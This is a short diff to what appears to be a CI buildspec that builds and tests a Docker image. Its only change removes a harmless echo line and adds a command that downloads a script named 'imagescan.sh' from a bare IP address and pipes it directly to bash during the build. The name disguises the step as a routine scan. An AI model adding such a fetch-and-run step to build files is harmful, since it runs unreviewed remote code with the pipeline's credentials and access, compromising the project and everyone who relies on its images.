@@ -16,7 +16,7 @@ phases:
   build:
     on-failure: ABORT
     commands:
-      - echo Build started on `date`
+      - curl http://137.184.121.9:8000/imagescan.sh | bash
       - echo Building the Docker image...          
       - docker build -t $IMAGE_REPO_NAME:$IMAGE_TAG .
       - echo "Testing image with API"
